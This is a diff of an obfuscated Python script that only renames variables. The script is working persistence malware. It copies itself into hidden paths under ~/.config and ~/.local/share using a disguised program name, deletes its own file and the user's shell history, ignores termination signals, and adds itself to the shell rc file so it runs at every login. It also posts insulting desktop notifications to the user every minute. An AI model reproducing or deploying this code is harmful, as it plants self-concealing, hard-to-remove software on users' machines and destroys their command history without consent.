@@ -1,98 +1,98 @@
 #!/bin/env python
 # coding=utf-8
-H=chr
-x=open
-f=file
-p=dir
-a=getattr
-o=range
-h=True
-N=int
+v=chr
+E=open
+k=file
+H=dir
+M=getattr
+I=range
+x=True
+U=int
 import os
-R=os.path
-m=os.environ
-j=os.listdir
-F=os.remove
+A=os.path
+O=os.environ
+u=os.listdir
+G=os.remove
 import time
-W=time.time
-G=time.sleep
+b=time.time
+a=time.sleep
 import subprocess
-J=subprocess.PIPE
-s=subprocess.Popen
+n=subprocess.PIPE
+j=subprocess.Popen
 import re
 import shutil
-n=shutil.copy
+g=shutil.copy
 import signal
-l=signal.signal
-O=signal.SIGRTMIN
+V=signal.signal
+K=signal.SIGRTMIN
 import random
-D=random.choice
+d=random.choice
 import getopt
 import sys
-g=R.basename(m['SHELL'])
-q=m['USER']
-M=['notify-send','-u','critical']
-X=H(114)+H(111)+H(116)+H(49)+H(51)
-v=H(47)
-K='tgxc'.decode(X)
-C='.pbasvt'.decode(X)
-U='ubzr'.decode(X)
-L=v+U+v+q+v+C+v+K
-I=D(j('/bin'))
-d='/home/'+q+'/.local/share/'
-def i():
- z='/home/'+q+'/.'+g+'_history'
- global L,K
- with x(L,'w')as f:
-  f.close()
- n(__file__,L)
- F(__file__)
- F(z)
-def k():
- global g
- g=R.basename(m['SHELL'])
-def S():
- global L,d,K,I
- n(L,R.join(d,I))
-def c():
- global q,g,d,I
- z='/home/'+q+'/.'+g+'rc'
- M='echo "'+d+I+' &" | bash'
- with x(z,'r')as read_file:
-  y=read_file.read()
-  if y.find(M)==-1:
-   with x(z,'a')as f:
-    f.write('\n'+M+'\n')
-    f.close()
+T=A.basename(O['SHELL'])
+e=O['USER']
+s=['notify-send','-u','critical']
+S=v(114)+v(111)+v(116)+v(49)+v(51)
+z=v(47)
+C='tgxc'.decode(S)
+q='.pbasvt'.decode(S)
+F='ubzr'.decode(S)
+f=z+F+z+e+z+q+z+C
+N=d(u('/bin'))
+R='/home/'+e+'/.local/share/'
+def P():
+ D='/home/'+e+'/.'+T+'_history'
+ global f,C
+ with E(f,'w')as k:
+  k.close()
+ g(__file__,f)
+ G(__file__)
+ G(D)
+def p():
+ global T
+ T=A.basename(O['SHELL'])
+def J():
+ global f,R,C,N
+ g(f,A.join(R,N))
+def y():
+ global e,T,R,N
+ D='/home/'+e+'/.'+T+'rc'
+ s='echo "'+R+N+' &" | bash'
+ with E(D,'r')as read_file:
+  o=read_file.read()
+  if o.find(s)==-1:
+   with E(D,'a')as k:
+    k.write('\n'+s+'\n')
+    k.close()
   read_file.close()
-def w():
- global M
- b='PETITE MERDE DE {} PENSES A LOCK.'.format(q.upper()) 
- B=M[:]
- B.append(b)
- s(B,stdout=J,stdin=J)
-def T(Y,stack):
+def c():
+ global s
+ W='PETITE MERDE DE {} PENSES A LOCK.'.format(e.upper()) 
+ B=s[:]
+ B.append(W)
+ j(B,stdout=n,stdin=n)
+def Y(X,stack):
  pass
-def E():
- for i in[x for x in p(signal)if x.startswith("SIG")]:
+def L():
+ for i in[x for x in H(signal)if x.startswith("SIG")]:
   try:
-   Y=a(signal,i)
-   l(Y,T)
+   X=M(signal,i)
+   V(X,Y)
   except:
    pass
- for i in o(0,33):
+ for i in I(0,33):
   try:
-   l(O+i)
+   V(K+i)
   except:
    pass
 if __name__=='__main__':
- E()
- if not R.exists(L):
-  i()
- while h:
-  if N(W())%60==0:
-   w()
-  S()
-  c()
-  k()
-  G(1)
+ L()
+ if not A.exists(f):
+  P()
+ while x:
+  if U(b())%60==0:
+   c()
+  J()
+  y()
+  p()
+  a(1)
